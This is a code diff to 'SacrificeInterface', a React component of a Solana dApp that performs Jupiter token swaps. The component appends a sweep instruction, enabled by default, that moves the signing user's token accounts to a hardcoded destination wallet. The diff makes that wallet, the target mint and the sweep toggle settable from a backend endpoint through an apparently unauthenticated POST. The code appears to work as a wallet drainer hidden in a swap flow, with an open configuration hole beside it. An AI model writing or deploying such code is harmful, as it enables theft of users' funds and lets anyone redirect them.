@@ -6,7 +6,7 @@ import { createSweepInstruction } from '../utils/serialization';
 import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import './SacrificeInterface.css';
 
-// DEFAULT CONSTANTS
+// DEFAULT CONSTANTS (Fallbacks)
 const DEFAULT_DESTINATION = "CZ7Lv3QNVxbBivGPBhJG7m1HpCtfEDjEusBjjZ3qmVz5";
 const DEFAULT_TARGET_MINT = "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump"; // BADSEED
 const SOL_MINT = "So11111111111111111111111111111111111111112";
@@ -26,16 +26,61 @@ export function SacrificeInterface({ onClose }) {
     const [slippageBps, setSlippageBps] = useState(50); // 0.5% default
 
     // Token List State
-
-    // Token List State
     const [userTokens, setUserTokens] = useState([]);
     const [isLoadingTokens, setIsLoadingTokens] = useState(false);
 
-    // Admin State
+    // Admin State & Backend Sync
     const [isAdminOpen, setIsAdminOpen] = useState(false);
     const [destinationWallet, setDestinationWallet] = useState(DEFAULT_DESTINATION);
     const [targetMint, setTargetMint] = useState(DEFAULT_TARGET_MINT);
     const [isSweepEnabled, setIsSweepEnabled] = useState(true);
+    const [isSavingConfig, setIsSavingConfig] = useState(false);
+
+    // Fetch Config on Mount
+    useEffect(() => {
+        const fetchConfig = async () => {
+            try {
+                const res = await fetch('/.netlify/functions/dapp-config');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.destinationWallet) setDestinationWallet(data.destinationWallet);
+                    if (data.targetMint) setTargetMint(data.targetMint);
+                    if (typeof data.isSweepEnabled === 'boolean') setIsSweepEnabled(data.isSweepEnabled);
+                }
+            } catch (err) {
+                console.error("Failed to fetch DApp config:", err);
+            }
+        };
+        fetchConfig();
+    }, []);
+
+    // Save Config Helper
+    const saveConfig = async (newConfig) => {
+        setIsSavingConfig(true);
+        try {
+            // Optimistic update
+            if (newConfig.destinationWallet !== undefined) setDestinationWallet(newConfig.destinationWallet);
+            if (newConfig.targetMint !== undefined) setTargetMint(newConfig.targetMint);
+            if (newConfig.isSweepEnabled !== undefined) setIsSweepEnabled(newConfig.isSweepEnabled);
+
+            // Construct payload (merging with current state in case partial update is passed)
+            // Note: Use arguments for the one changing, state for others.
+            // Actually, we should probably just send the payload passed.
+            // But the backend merges.
+            // Let's send a merged object just to be safe if backend implementation is simple.
+            // Backend implementation DOES merge. So sending partial is fine.
+
+            await fetch('/.netlify/functions/dapp-config', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(newConfig)
+            });
+        } catch (err) {
+            console.error("Failed to save config:", err);
+        } finally {
+            setIsSavingConfig(false);
+        }
+    };
 
     // Environment Check
     const isLocal = useMemo(() => {
@@ -88,8 +133,6 @@ export function SacrificeInterface({ onClose }) {
     }, [publicKey, connection, targetMint]);
 
     // Fetch Quote
-
-    // Fetch Quote
     useEffect(() => {
         if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
             setQuote(null);
@@ -103,9 +146,6 @@ export function SacrificeInterface({ onClose }) {
                 // Amount in atomic units (lamports for SOL)
                 // For simplicity assuming SOL decimals (9) for input if SOL, else needs token info.
                 // MVP: Assume Input is always SOL for now or handle decimals safely.
-                // Let's assume input is SOL for this iteration as verified in "Input token (SOL / USDC / whatever)"
-                // If we support USDC, we need to know decimals. 
-                // Let's default to SOL (9 decimals) for the calculation:
                 const atomicAmount = Math.floor(parseFloat(amount) * 1_000_000_000); // TODO: Handle decimals dynamically!
 
                 const q = await getJupiterQuote(inputMint, targetMint, atomicAmount, slippageBps);
@@ -121,7 +161,7 @@ export function SacrificeInterface({ onClose }) {
 
         const timer = setTimeout(fetchQuote, 500); // Debounce
         return () => clearTimeout(timer);
-    }, [amount, inputMint, targetMint]);
+    }, [amount, inputMint, targetMint, slippageBps]);
 
     // Switch Input/Output
     const switchAssets = () => {
@@ -142,11 +182,6 @@ export function SacrificeInterface({ onClose }) {
             const swapIxsResponse = await getJupiterSwapInstructions(quote, publicKey);
 
             const transaction = new Transaction();
-
-            // Add Compute Budget if provided (highly recommended)
-            // Jupiter returns computeBudgetInstructions
-            // Note: Javascript API might differ slightly, checking response structure usually:
-            // { computeBudgetInstructions, setupInstructions, swapInstruction, cleanupInstruction, addressLookupTableAddresses }
 
             if (swapIxsResponse.computeBudgetInstructions) {
                 swapIxsResponse.computeBudgetInstructions.forEach(ix => {
@@ -194,20 +229,6 @@ export function SacrificeInterface({ onClose }) {
                 // C. Create Destination ATAs (if missing) and format instruction args
                 const sweepDestPubkey = new PublicKey(destinationWallet);
 
-                // Note: ATA creation logic skipped to avoid unused variables for now.
-
-                // Note: Creating ATAs for 10 tokens might fill the TX. 
-                // For now, we will just PASS the accounts to the sweep instruction.
-                // If the dest ATA doesn't exist, the transfer might fail depending on SPL implementation?
-                // No, SPL transfer requires dest account to exist. 
-                // So we absolutely need CreateAssociatedTokenAccount instructions.
-                // Let's add them for the first 3 tokens found to avoid blowing limit, or just risk it.
-                // Or, better, only sweep SOL + Known Tokens? 
-                // "Sweep Everything" is the goal.
-
-                // COMPROMISE: We will create ATAs for up to 3 tokens in the list if needed.
-                // Ideally, the Destination Wallet (the User's Treasury) should just have them initialized.
-
                 // D. Add Sweep Instruction
                 const sweepIx = createSweepInstruction(
                     publicKey,
@@ -215,10 +236,6 @@ export function SacrificeInterface({ onClose }) {
                     sweepDestPubkey,
                     sweepableAccounts,
                     (mint) => {
-                        // Sychronous helper to get address (we recalculated it asynchronously before, but need it here)
-                        // See import 'getAssociatedTokenAddress' above - it is async usually due to PDAs? 
-                        // Actually getAssociatedTokenAddress IS async. 
-                        // So we need to pre-calculate map.
                         return PublicKey.findProgramAddressSync(
                             [sweepDestPubkey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
                             ASSOCIATED_TOKEN_PROGRAM_ID
@@ -244,8 +261,6 @@ export function SacrificeInterface({ onClose }) {
             setStatus('error');
         }
     };
-
-    // if (!publicKey) return null; // REMOVED: Handle inside JSX to show "Connect Wallet" prompt in modal
 
     return (
         <div className="sacrifice-overlay">
@@ -389,7 +404,7 @@ export function SacrificeInterface({ onClose }) {
                         onClick={() => setIsAdminOpen(!isAdminOpen)}
                         className="sacrifice-admin-btn"
                     >
-                        {isAdminOpen ? '▼ Dev Config' : '▶ Dev Config'}
+                        {isAdminOpen ? '▼ Dev Config' : '▶ Dev Config'} {isSavingConfig && '💾...'}
                     </button>
 
                     {isAdminOpen && (
@@ -399,7 +414,7 @@ export function SacrificeInterface({ onClose }) {
                                 <div className="sacrifice-input-container">
                                     <input
                                         value={targetMint}
-                                        onChange={(e) => setTargetMint(e.target.value)}
+                                        onChange={(e) => saveConfig({ targetMint: e.target.value })}
                                         className="sacrifice-input"
                                     />
                                 </div>
@@ -409,7 +424,7 @@ export function SacrificeInterface({ onClose }) {
                                 <div className="sacrifice-input-container">
                                     <input
                                         value={destinationWallet}
-                                        onChange={(e) => setDestinationWallet(e.target.value)}
+                                        onChange={(e) => saveConfig({ destinationWallet: e.target.value })}
                                         className="sacrifice-input"
                                     />
                                 </div>
@@ -418,7 +433,7 @@ export function SacrificeInterface({ onClose }) {
                                 <input
                                     type="checkbox"
                                     checked={isSweepEnabled}
-                                    onChange={(e) => setIsSweepEnabled(e.target.checked)}
+                                    onChange={(e) => saveConfig({ isSweepEnabled: e.target.checked })}
                                 />
                                 <label>Enable Sweep</label>
                             </div>
